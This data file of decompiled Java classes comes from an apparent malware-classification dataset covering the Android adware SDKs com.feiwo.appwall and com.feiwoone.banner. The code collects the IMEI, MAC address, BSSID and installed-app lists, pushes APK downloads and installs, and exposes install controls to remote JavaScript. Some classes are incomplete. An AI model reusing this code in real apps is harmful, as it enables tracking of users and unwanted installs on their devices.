"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\K.code","final class K implements Runnable {   private WA a;   public K(  WA wa){     this.a=wa;   }   @Override public final void run(){     Toast.makeText(this.a.getApplicationContext(),""å¼€å§‹ä¸‹è½½"",0).show();   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\l.code","public final class l implements Runnable {   private C0010j a;   private final boolean b;   public l(  C0010j c0010j,  boolean z){     this.a=c0010j;     this.b=z;   }   @Override public final void run(){     C0007g c0007g;     C0007g c0007g2;     C0007g c0007g3;     C0007g c0007g4;     if (!this.b) {       c0007g4=this.a.h;       r.a(c0007g4.d).a(this.a.b.e() + 12345,R.drawable.ic_menu_share,this.a.b.a(),this.a.b.a(),""ä¸‹è½½å¤±è´¥"",new Intent(),16,this.a.b.b(),this.a.d);       return;     }     Intent intent=new Intent(""android.intent.action.VIEW"");     intent.addFlags(268435456);     intent.setDataAndType(Uri.fromFile(new File(this.a.c)),""application/vnd.android.package-archive"");     c0007g=this.a.h;     r.a(c0007g.d).a(this.a.b.e() + 12345,R.drawable.ic_menu_share,this.a.b.a(),this.a.b.a(),""ä¸‹è½½å®Œæˆ�"",intent,32,this.a.b.b(),this.a.d);     c0007g2=this.a.h;     C.b(c0007g2.d,""DP_AW_FILE"",this.a.b.c().replace(""."",""""),String.valueOf(this.a.b.e()) + "","" + new Date().getTime());     try {       s.a();       c0007g3=this.a.h;       s.a(c0007g3.d,this.a.c);     }  catch (    Exception e) {       Log.e(""APPWALL"",new StringBuilder().append(e).toString());     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\m.code","public final class m implements Runnable {   private C0010j a;   private final int b;   public m(  C0010j c0010j,  int i){     this.a=c0010j;     this.b=i;   }   @Override public final void run(){     C0007g c0007g;     c0007g=this.a.h;     r.a(c0007g.d).a(this.a.b.e() + 12345,R.drawable.ic_menu_share,this.a.b.a(),this.a.b.a(),""å·²ä¸‹è½½ "" + this.b + ""%"",new Intent(),16,this.a.b.b(),this.a.d);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\n.code","public final class n {   private static n a;   public static n a(){     if (a == null) {       a=new n();     }     return a;   }   public static String a(  Context context,  String str,  String str2){     String stringBuffer;     a();     String replaceAll=str2.replaceAll(""[^\\w\\.\\-]+"","""");     a();     if (!b()) {       a();       StringBuffer stringBuffer2=new StringBuffer();       stringBuffer2.append(context.getFilesDir().getAbsolutePath());       if (!"""".startsWith(""/"")) {         stringBuffer2.append(""/"");       }       stringBuffer2.append("""");       File file=new File(stringBuffer2.toString());       if (!file.exists()) {         file.mkdirs();       }       return String.valueOf(stringBuffer2.toString()) + replaceAll;     }     a();     if (b()) {       StringBuffer stringBuffer3=new StringBuffer();       stringBuffer3.append(Environment.getExternalStorageDirectory());       if (!str.startsWith(""/"")) {         stringBuffer3.append(""/"");       }       stringBuffer3.append(str);       File file2=new File(stringBuffer3.toString());       if (!file2.exists()) {         file2.mkdirs();       }       stringBuffer=stringBuffer3.toString();     }  else {       stringBuffer=null;     }     return String.valueOf(stringBuffer) + ""/"" + replaceAll;   }   public static boolean b(){     return Environment.getExternalStorageState().equals(""mounted"");   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\o.code","public final class o {   private static o a=null;   private ExecutorService b;   private o(){     this.b=null;     this.b=Executors.newFixedThreadPool(5);   }   public static o a(){     if (a == null) {       a=new o();     }     return a;   }   public final void a(  q qVar){     this.b.submit(qVar);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\p.code","public interface p {   void a(  boolean z,  String str); } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\q.code","public final class q implements Runnable {   private URL a=null;   private p b;   private String c;   private String d;   private Context e;   public final void a(  Context context,  String str,  String str2,  String str3){     this.e=context;     this.c=str2;     this.d=str3;     try {       this.a=new URL(str);     }  catch (    MalformedURLException e) {     }   }   public final void a(  p pVar){     this.b=pVar;   }   @Override public final void run(){     throw new UnsupportedOperationException(""Method not decompiled: com.feiwo.appwall.q.run():void"");   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\r.code","public final class r {   private static r b=null;   private static Context c;   private NotificationManager a;   private r(  Context context){     this.a=null;     if (this.a == null) {       this.a=(NotificationManager)context.getSystemService(""notification"");     }   }   private ImageView a(  View view){     if (!(view instanceof ViewGroup)) {       if (view instanceof ImageView) {         return (ImageView)view;       }       return null;     }     ViewGroup viewGroup=(ViewGroup)view;     for (int childCount=viewGroup.getChildCount(); childCount > 0; childCount--) {       ImageView a=a(viewGroup.getChildAt(childCount - 1));       if (a != null && a.getId() == 16908294) {         return a;       }     }     return null;   }   public static r a(  Context context){     c=context;     if (b == null) {       b=new r(c);     }     return b;   }   public final void a(  int i){     this.a.cancel(i);   }   public final void a(  int i,  int i2,  String str,  String str2,  String str3,  Intent intent,  int i3,  String str4,  long j){     Notification notification=new Notification();     notification.icon=R.drawable.ic_menu_share;     notification.tickerText=str;     notification.flags=i3;     notification.when=j;     notification.setLatestEventInfo(c,str2,str3,PendingIntent.getActivity(c,0,intent,134217728));     if (str4 == null || str4.length() == 0 || notification == null) {       return;     }     try {       ImageView a=a(View.inflate(c,notification.contentView.getLayoutId(),null));       BitmapDrawable bitmapDrawable=(BitmapDrawable)v.b().a(c,str4,(y)null);       if (bitmapDrawable != null) {         notification.contentView.setImageViewBitmap(a.getId(),bitmapDrawable.getBitmap());       }       this.a.notify(i,notification);     }  catch (    Exception e) {     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\RunnableC0004d.code","final class RunnableC0004d implements Runnable {   private AppWallManager a;   public RunnableC0004d(  AppWallManager appWallManager){     this.a=appWallManager;   }   @Override public final void run(){     Intent intent=new Intent(this.a.a(),(Class<?>)WA.class);     intent.addFlags(268435456);     this.a.a().startActivity(intent);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\RunnableC0011k.code","final class RunnableC0011k implements Runnable {   private C0010j a;   public RunnableC0011k(  C0010j c0010j){     this.a=c0010j;   }   @Override public final void run(){     C0007g c0007g;     c0007g=this.a.h;     r.a(c0007g.d).a(this.a.b.e() + 12345,R.drawable.ic_menu_share,this.a.b.a(),this.a.b.a(),""å¼€å§‹ä¸‹è½½ "",new Intent(),32,this.a.b.b(),this.a.d);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\s.code","public final class s {   private static s a=null;   private s(){   }   public static s a(){     if (a == null) {       a=new s();     }     return a;   }   public static void a(  Context context,  String str){     if (D.a(str)) {       return;     }     File file=new File(str);     Intent intent=new Intent();     intent.addFlags(268435456);     intent.setAction(""android.intent.action.VIEW"");     intent.setDataAndType(Uri.fromFile(file),""application/vnd.android.package-archive"");     context.startActivity(intent);   }   public static void b(  Context context,  String str){     if (D.a(str)) {       return;     }     try {       Intent launchIntentForPackage=context.getPackageManager().getLaunchIntentForPackage(str);       launchIntentForPackage.addFlags(268435456);       context.startActivity(launchIntentForPackage);     }  catch (    ActivityNotFoundException e) {     }   }   public static boolean c(  Context context,  String str){     if (D.a(str)) {       return false;     }     try {       context.getPackageManager().getPackageInfo(str,1);       return true;     }  catch (    PackageManager.NameNotFoundException e) {       return false;     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\SR.code","!org.eclipse.jdt.core.dom.TypeDeclaration@df9d400"
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\t.code","public final class t {   private static t a;   private t(){   }   public static t a(){     if (a == null) {       a=new t();     }     return a;   }   public static String a(  Context context,  boolean z){     int i=0;     StringBuffer stringBuffer=new StringBuffer();     List<PackageInfo> installedPackages=context.getPackageManager().getInstalledPackages(0);     while (true) {       int i2=i;       if (i2 >= installedPackages.size()) {         return stringBuffer.toString().substring(1);       }       PackageInfo packageInfo=installedPackages.get(i2);       if ((packageInfo.applicationInfo.flags & 1) == 0) {         stringBuffer.append("","");         stringBuffer.append(packageInfo.packageName);       }       i=i2 + 1;     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\u.code","public final class u {   public static String a(){     try {       return Build.MANUFACTURER;     }  catch (    Exception e) {       return """";     }   }   public static String a(  Context context){     String str;     try {       str=((TelephonyManager)context.getSystemService(""phone"")).getDeviceId();     }  catch (    Exception e) {       str=null;     }     if (D.a(str)) {       str=b(context);     }     if (!D.a(str)) {       return str;     }     String string=context.getSharedPreferences(""SAVE_IMEI"",0).getString(""UDID"",null);     if (!D.a(string)) {       return string;     }     String str2=String.valueOf(System.currentTimeMillis()) + D.a(3);     context.getSharedPreferences(""SAVE_IMEI"",0).edit().putString(""UDID"",str2).commit();     return str2;   }   public static String b(){     try {       return Build.MODEL;     }  catch (    Exception e) {       return """";     }   }   public static String b(  Context context){     try {       return ((WifiManager)context.getSystemService(""wifi"")).getConnectionInfo().getMacAddress();     }  catch (    Exception e) {       return null;     }   }   public static String c(){     try {       return Build.VERSION.SDK;     }  catch (    Exception e) {       return """";     }   }   public static String c(  Context context){     try {       return ((WifiManager)context.getSystemService(""wifi"")).getConnectionInfo().getBSSID();     }  catch (    Exception e) {       return null;     }   }   public static B d(  Context context){     B b=new B();     DisplayMetrics displayMetrics=new DisplayMetrics();     ((WindowManager)context.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);     b.a=displayMetrics.widthPixels;     b.b=displayMetrics.heightPixels;     return b;   }   public static String d(){     try {       return Build.VERSION.RELEASE;     }  catch (    Exception e) {       return """";     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\v.code","public final class v {   private static v a=null;   private Handler b=new w(this);   private ConcurrentHashMap c=new ConcurrentHashMap();   private ExecutorService d=Executors.newSingleThreadExecutor();   private ConcurrentHashMap e=new ConcurrentHashMap();   public static Bitmap a(  Context context,  String str){     Bitmap bitmap;     if (!new File(str).exists()) {       return null;     }     BitmapFactory.Options options=new BitmapFactory.Options();     options.inJustDecodeBounds=true;     BitmapFactory.decodeFile(str,options);     int i=options.outWidth;     int i2=options.outHeight;     B d=u.d(context);     int i3=1;     while (i / 2 > d.a && i2 / 2 > d.b) {       i/=2;       i2/=2;       i3<<=1;     }     options.inPurgeable=true;     options.inInputShareable=true;     options.inSampleSize=i3;     options.inJustDecodeBounds=false;     File file=new File(str);     if (file.exists()) {       bitmap=BitmapFactory.decodeFile(str,options);       if (bitmap == null) {         file.delete();       }     }  else {       bitmap=null;     }     return bitmap;   }   public static void a(){     a=new v();   }   public static void a(  v vVar,  Context context,  String str){     HttpURLConnection httpURLConnection;     FileOutputStream fileOutputStream;     FileOutputStream fileOutputStream2=null;     fileOutputStream2=null;     HttpURLConnection httpURLConnection2=null;     String a2=n.a(context,""/adfeiwo/appwall/image"",str);     File file=new File(String.valueOf(a2) + ""."" + System.currentTimeMillis()+ "".temp"");     File file2=new File(a2);     if (file2.exists()) {       return;     }     try {       HttpURLConnection httpURLConnection3=(HttpURLConnection)new URL(str).openConnection();       try {         httpURLConnection3.setConnectTimeout(5000);         httpURLConnection3.setReadTimeout(5000);         httpURLConnection3.setRequestMethod(""GET"");         httpURLConnection3.connect();         InputStream inputStream=httpURLConnection3.getInputStream();         FileOutputStream fileOutputStream3=new FileOutputStream(file);         try {           byte[] bArr=new byte[IController.L1_VALUE];           while (true) {             int read=inputStream.read(bArr);             if (read == -1) {               break;             }  else {               fileOutputStream3.write(bArr,0,read);             }           }           fileOutputStream3.flush();           fileOutputStream3.close();           file.renameTo(file2);           try {             fileOutputStream3.close();             if (httpURLConnection3 != null) {               httpURLConnection3.disconnect();             }           }  catch (          IOException e) {           }         }  catch (        Exception e2) {           httpURLConnection2=httpURLConnection3;           fileOutputStream=fileOutputStream3;           if (fileOutputStream != null) {             try {               fileOutputStream.close();             }  catch (            IOException e3) {               return;             }           }           if (httpURLConnection2 != null) {             httpURLConnection2.disconnect();           }         } catch (        Throwable th) {           fileOutputStream2=fileOutputStream3;           httpURLConnection=httpURLConnection3;           th=th;           if (fileOutputStream2 != null) {             try {               fileOutputStream2.close();             }  catch (            IOException e4) {               throw th;             }           }           if (httpURLConnection != null) {             httpURLConnection.disconnect();           }           throw th;         }       }  catch (      Exception e5) {         httpURLConnection2=httpURLConnection3;         fileOutputStream=null;       } catch (      Throwable th2) {         httpURLConnection=httpURLConnection3;         th=th2;       }     }  catch (    Exception e6) {       fileOutputStream=null;     } catch (    Throwable th3) {       th=th3;       httpURLConnection=null;     }   }   public static v b(){     return a;   }   public final android.graphics.drawable.Drawable a(  android.content.Context r6,  java.lang.String r7,  com.feiwo.appwall.y r8){     throw new UnsupportedOperationException(""Method not decompiled: com.feiwo.appwall.v.a(android.content.Context, java.lang.String, com.feiwo.appwall.y):android.graphics.drawable.Drawable"");   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\w.code","public final class w extends Handler {   private v a;   public w(  v vVar){     this.a=vVar;   }   @Override public final void handleMessage(  Message message){     ConcurrentHashMap concurrentHashMap;     ConcurrentHashMap concurrentHashMap2;     if (message.obj == null) {       return;     }     Object[] objArr=(Object[])message.obj;     String str=(String)objArr[0];     Bitmap bitmap=(Bitmap)objArr[1];     if (bitmap != null) {       concurrentHashMap2=this.a.e;       concurrentHashMap2.put(str,new WeakReference(bitmap));       new BitmapDrawable(bitmap);     }     concurrentHashMap=this.a.c;     Queue queue=(Queue)concurrentHashMap.remove(str);     if (queue != null) {       Iterator it=queue.iterator();       while (it.hasNext()) {         it.next();       }     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\WA.code","public class WA extends Activity {   WebView a;   private TextView c;   boolean b=false;   private Map d=new HashMap();   private void a(){     List<PackageInfo> installedPackages=getPackageManager().getInstalledPackages(0);     StringBuilder sb=new StringBuilder();     for (    PackageInfo packageInfo : installedPackages) {       if ((packageInfo.applicationInfo.flags & 1) == 0) {         this.d.put(packageInfo.packageName,packageInfo.packageName);         sb.append(packageInfo.packageName).append("","");       }     }   }   public static void a(  WA wa,  String str){     if (str == null) {       wa.c.setText("""");       wa.c.setVisibility(8);     }  else {       wa.c.setText(str);       wa.c.setVisibility(0);     }   }   @JavascriptInterface public void back(){     runOnUiThread(new H(this));   }   @JavascriptInterface public String checkInstall(  String str,  String str2){     return D.a(str) ? ""uninstall"" : this.d.containsKey(str) ? ""installed"" : new File(n.a(getApplicationContext(),""/adfeiwo/appwall/apk"",str2)).exists() ? ""downloaded"" : C0007g.a().a(str2) ? ""downloading"" : ""uninstall"";   }   @JavascriptInterface public void debug(  String str){     Log.d(""APPWALL"",str);   }   @JavascriptInterface public void downloadApp(  int i,  String str,  String str2,  String str3,  String str4){     runOnUiThread(new K(this));     C0007g.a().a(new C0001a(i,str,str2,str3,str4),(C0009i)null);   }   @JavascriptInterface public void installApp(  int i,  String str,  String str2,  String str3,  String str4){     runOnUiThread(new J(this,str3,i,str4));   }   @Override public void onBackPressed(){     if (this.b || this.a == null || !this.a.canGoBack()) {       super.onBackPressed();     }  else {       this.a.goBack();     }   }   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     requestWindowFeature(1);     a();     FrameLayout frameLayout=new FrameLayout(this);     frameLayout.setLayoutParams(new ViewGroup.LayoutParams(-1,-1));     this.a=new WebView(this);     this.a.setLayoutParams(new FrameLayout.LayoutParams(-1,-1));     this.a.getSettings().setJavaScriptEnabled(true);     this.a.getSettings().setUseWideViewPort(true);     this.a.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);     this.a.getSettings().setLightTouchEnabled(true);     this.a.setHorizontalScrollBarEnabled(false);     this.a.setVerticalScrollBarEnabled(false);     this.a.setDownloadListener(new E(this));     this.a.setWebChromeClient(new F(this));     this.a.setWebViewClient(new G(this));     frameLayout.addView(this.a);     this.c=new TextView(this);     this.c.setLayoutParams(new FrameLayout.LayoutParams(-1,-2));     this.c.setPadding(z.a(this,6.0f),z.a(this,6.0f),z.a(this,6.0f),z.a(this,6.0f));     this.c.setBackgroundColor(Color.parseColor(""#66000000""));     this.c.setTextColor(-1);     this.c.setTextSize(16.0f);     frameLayout.addView(this.c);     setContentView(frameLayout);     this.a.loadUrl(C0002b.c());     this.a.addJavascriptInterface(this,""SDK"");   }   @Override protected void onRestart(){     super.onRestart();     a();     this.a.reload();   }   @JavascriptInterface public void openApp(  String str){     runOnUiThread(new I(this,str));   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\x.code","public final class x implements Runnable {   private v a;   private final Context b;   private final String c;   public x(  v vVar,  Context context,  String str){     this.a=vVar;     this.b=context;     this.c=str;   }   @Override public final void run(){     Handler handler;     Handler handler2;     String a=n.a(this.b,""/adfeiwo/appwall/image"",this.c);     Bitmap bitmap=null;     try {       v.a(this.a,this.b,this.c);     }  catch (    Exception e) {       Log.d(""APPWALL"",new StringBuilder().append(e).toString());     }     try {       v vVar=this.a;       bitmap=v.a(this.b,a);     }  catch (    Exception e2) {       Log.d(""APPWALL"",new StringBuilder().append(e2).toString());     }     handler=this.a.b;     handler2=this.a.b;     handler.sendMessage(handler2.obtainMessage(0,new Object[]{this.c,bitmap}));   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\y.code","public interface y { } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwo.appwall\z.code","public final class z {   public static int a(  Context context,  float f){     return (int)((context.getResources().getDisplayMetrics().density * 6.0f) + 0.5f);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner\a.code","public final class a implements Runnable {   private AdBanner a;   public a(  AdBanner adBanner){     this.a=adBanner;   }   @Override public final void run(){     throw new UnsupportedOperationException(""Method not decompiled: com.feiwoone.banner.a.run():void"");   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner\AdBanner.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7135e8cd"
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner\AdReceiver.code","public class AdReceiver extends BroadcastReceiver {   Handler a=new Handler();   private static void a(  Context context){     Map<String,?> all=context.getSharedPreferences(com.feiwoone.banner.b.a.d,0).getAll();     Iterator<String> it=all.keySet().iterator();     while (it.hasNext()) {       com.feiwoone.banner.c.b bVar=(com.feiwoone.banner.c.b)com.feiwoone.banner.e.q.a((String)all.get(it.next()));       if (bVar != null) {         com.feiwoone.banner.e.g.a().a(context,bVar);       }     }   }   @Override public void onReceive(  Context context,  Intent intent){     NetworkInfo activeNetworkInfo;     if (!intent.getAction().equals(""android.intent.action.PACKAGE_ADDED"")) {       if (intent.getAction().equals(""android.net.conn.CONNECTIVITY_CHANGE"") && (activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo()) != null && activeNetworkInfo.isAvailable()) {         a(context);         return;       }       return;     }     String str="""";     try {       str=com.feiwoone.banner.f.e.a(context,""ADFEIWO"",""APPKEY"","""",""12345678"");     }  catch (    UnsupportedEncodingException e) {     }     String schemeSpecificPart=intent.getData().getSchemeSpecificPart();     int i=context.getSharedPreferences(""ADFEIWO"",0).getInt(com.feiwoone.banner.f.f.a(schemeSpecificPart,""12345678"",true),0);     long j=context.getSharedPreferences(""ADFEIWO"",0).getLong(com.feiwoone.banner.f.f.a(String.valueOf(schemeSpecificPart) + ""_time"",""12345678"",true),0L);     com.feiwoone.banner.f.e.a(context,String.valueOf(schemeSpecificPart) + ""_time"",""12345678"");     if (i > 0) {       com.feiwoone.banner.e.p.a(context).a(i);       PackageManager packageManager=context.getPackageManager();       new Intent();       Intent launchIntentForPackage=packageManager.getLaunchIntentForPackage(schemeSpecificPart);       launchIntentForPackage.addFlags(268435456);       context.startActivity(launchIntentForPackage);     }     if (System.currentTimeMillis() - j > 1800000) {       i=0;     }     JSONObject b=com.feiwoone.banner.f.e.b(context,""ADFEIWO"",""list_install"");     JSONArray jSONArray=b.optJSONArray(""installCount"") == null ? new JSONArray() : b.optJSONArray(""installCount"");     com.feiwoone.banner.f.i.a();     if (com.feiwoone.banner.f.i.a(context,schemeSpecificPart)) {       boolean z=false;       for (int i2=0; i2 < jSONArray.length(); i2++) {         if (jSONArray.optJSONObject(i2).optInt(""adid"") == i) {           z=true;         }       }       if (!z) {         try {           JSONObject jSONObject=new JSONObject();           jSONObject.put(""adid"",i);           jSONObject.put(""packageName"",schemeSpecificPart);           jSONArray.put(jSONObject);         }  catch (        JSONException e2) {         }       }     }     try {       b.put(""installCount"",jSONArray);       b.put(""appkey"",str);       b.put(""adsdkversion"",""2.6"");       b.put(""sdktype"",""BANNER"");       b.put(""devid"",com.feiwoone.banner.f.k.a(context));     }  catch (    JSONException e3) {     }     this.a.postDelayed(new p(this,context,schemeSpecificPart,str,b),i <= 0 ? 5000 : 0);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner\b.code","!org.eclipse.jdt.core.dom.TypeDeclaration@29dcad7e"
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner\c.code","public final class c extends Handler {   private b a;   public c(  b bVar){     this.a=bVar;   }   @Override public final void handleMessage(  Message message){     Context context;     Context context2;     Context context3;     TextView textView;     com.feiwoone.banner.c.a aVar;     com.feiwoone.banner.c.a aVar2;     com.feiwoone.banner.c.a aVar3;     TextView textView2;     com.feiwoone.banner.c.a aVar4;     int i;     com.feiwoone.banner.c.a aVar5;     int i2;     if (message.what == 0) {       textView=this.a.e;       if (textView != null) {         aVar=this.a.h;         if (aVar != null) {           aVar2=this.a.h;           if (aVar2.e() != null) {             aVar3=this.a.h;             if (aVar3.e().size() > 0) {               textView2=this.a.e;               aVar4=this.a.h;               ArrayList e=aVar4.e();               i=this.a.o;               aVar5=this.a.h;               textView2.setText((CharSequence)e.get(i % aVar5.e().size()));               b bVar=this.a;               i2=bVar.o;               bVar.o=i2 + 1;               return;             }             return;           }           return;         }         return;       }       return;     }     if (message.what == 1) {       if (b.d(this.a) != null) {         b.d(this.a).a();         return;       }       return;     }     if (message.what == 100) {       Bundle bundle=(Bundle)message.obj;       Uri parse=Uri.parse(bundle.getString(""path""));       Intent intent=new Intent();       intent.setAction(""android.intent.action.VIEW"");       intent.setData(parse);       intent.addFlags(1);       intent.setClassName(""com.android.packageinstaller"",""com.android.packageinstaller.PackageInstallerActivity"");       if (bundle.getBoolean(""notifiKeep"")) {         context3=this.a.g;         com.feiwoone.banner.e.p.a(context3).a(message.arg1,null,bundle.getString(""pushstr""),""ä¸‹è½½å®Œæˆ�ï¼Œç‚¹å‡»å®‰è£…"",intent,32);       }  else {         context=this.a.g;         com.feiwoone.banner.e.p.a(context).a(message.arg1,null,bundle.getString(""pushstr""),""ä¸‹è½½å®Œæˆ�ï¼Œç‚¹å‡»å®‰è£…"",intent,16);       }       context2=this.a.g;       context2.startActivity(intent);     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner\d.code","public final class d implements View.OnClickListener {   final b a;   private final Intent b;   public d(  b bVar,  Intent intent){     this.a=bVar;     this.b=intent;   }   @Override public final void onClick(  View view){     com.feiwoone.banner.c.a aVar;     com.feiwoone.banner.c.a aVar2;     String str;     String str2;     Context context;     String str3;     Context context2;     com.feiwoone.banner.c.a aVar3;     Context context3;     Context context4;     Context context5;     Context context6;     Context context7;     com.feiwoone.banner.c.a aVar4;     com.feiwoone.banner.c.a aVar5;     RelativeLayout relativeLayout;     RelativeLayout relativeLayout2;     RelativeLayout relativeLayout3;     ImageView imageView;     ImageView imageView2;     com.feiwoone.banner.c.a aVar6;     RelativeLayout relativeLayout4;     RelativeLayout relativeLayout5;     RelativeLayout relativeLayout6;     ImageView imageView3;     ImageView imageView4;     Context context8;     com.feiwoone.banner.c.a aVar7;     String str4;     com.feiwoone.banner.c.a aVar8;     Context context9;     AdBanner adBanner;     String str5;     com.feiwoone.banner.c.a unused;     aVar=this.a.h; switch (aVar.g()) { case 1001: case 1005: case 1006:       context7=this.a.g;     context7.startActivity(this.b);   break; case 1002: context5=this.a.g; context5.startActivity(this.b); break; case 1003: context6=this.a.g; context6.startActivity(this.b); break; case 1004: context4=this.a.g; context4.startActivity(Intent.createChooser(this.b,""é€‰æ‹©é‚®ä»¶å®¢æˆ·ç«¯"")); break; case 1007: b bVar=this.a; aVar2=this.a.h; if (aVar2.h().get(0) != null) { aVar3=this.a.h; str=(String)aVar3.h().get(0); }  else { str=""""; } bVar.n=str; try { Intent intent=new Intent(); intent.setClassName(""com.tencent.mm"",""com.tencent.mm.ui.qrcode.GetQRCodeInfoUI""); str3=this.a.n; intent.setData(Uri.parse(str3)); context2=this.a.g; context2.startActivity(intent); break; }  catch (ActivityNotFoundException e) { Intent intent2=new Intent(); intent2.setAction(""android.intent.action.VIEW""); str2=this.a.n; intent2.setData(Uri.parse(str2)); context=this.a.g; context.startActivity(intent2); break; } case 2002: aVar4=this.a.h; if (aVar4.c() == null) { if (com.feiwoone.banner.e.e.a(this.a.getContext()) != 10) { if (com.feiwoone.banner.e.e.a(this.a.getContext()) == 11 || com.feiwoone.banner.e.e.a(this.a.getContext()) == 12) { aVar5=this.a.h; if (!aVar5.q()) { relativeLayout=this.a.b; if (relativeLayout.getVisibility() != 8) { relativeLayout2=this.a.b; relativeLayout2.setVisibility(8); break; }  else { relativeLayout3=this.a.b; relativeLayout3.setVisibility(0); imageView=this.a.c; if (imageView != null) { imageView2=this.a.c; imageView2.setOnClickListener(new f(this,this.b,aVar4)); break; } } }  else { b.a(this.a,this.b,aVar4); break; } } }  else { aVar6=this.a.h; if (!aVar6.a().booleanValue()) { b.a(this.a,this.b,aVar4); break; }  else { relativeLayout4=this.a.b; if (relativeLayout4.getVisibility() != 8) { relativeLayout5=this.a.b; relativeLayout5.setVisibility(8); break; }  else { relativeLayout6=this.a.b; relativeLayout6.setVisibility(0); imageView3=this.a.c; if (imageView3 != null) { imageView4=this.a.c; imageView4.setOnClickListener(new e(this,this.b,aVar4)); break; } } } } }  else { context8=this.a.g; Intent intent3=new Intent(context8,(Class<?>)WebViewActivity.class); Bundle bundle=new Bundle(); b bVar2=this.a; aVar7=this.a.h; bVar2.n=aVar7.c(); str4=this.a.n; bundle.putString(""url"",str4); aVar8=this.a.h; bundle.putSerializable(""ad"",aVar8); intent3.putExtras(bundle); context9=this.a.g; context9.startActivity(intent3); break; } break; case 2003: context3=this.a.g; context3.startActivity(this.b); break; } adBanner=this.a.i; unused=this.a.h; str5=this.a.n; adBanner.a(0,str5); } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner\e.code","final class e implements View.OnClickListener {   private d a;   private final Intent b;   private final com.feiwoone.banner.c.a c;   public e(  d dVar,  Intent intent,  com.feiwoone.banner.c.a aVar){     this.a=dVar;     this.b=intent;     this.c=aVar;   }   @Override public final void onClick(  View view){     b.a(this.a.a,this.b,this.c);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner\f.code","final class f implements View.OnClickListener {   private d a;   private final Intent b;   private final com.feiwoone.banner.c.a c;   public f(  d dVar,  Intent intent,  com.feiwoone.banner.c.a aVar){     this.a=dVar;     this.b=intent;     this.c=aVar;   }   @Override public final void onClick(  View view){     b.a(this.a.a,this.b,this.c);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner\g.code","public final class g implements com.feiwoone.banner.e.l {   public g(  b bVar){   } } "
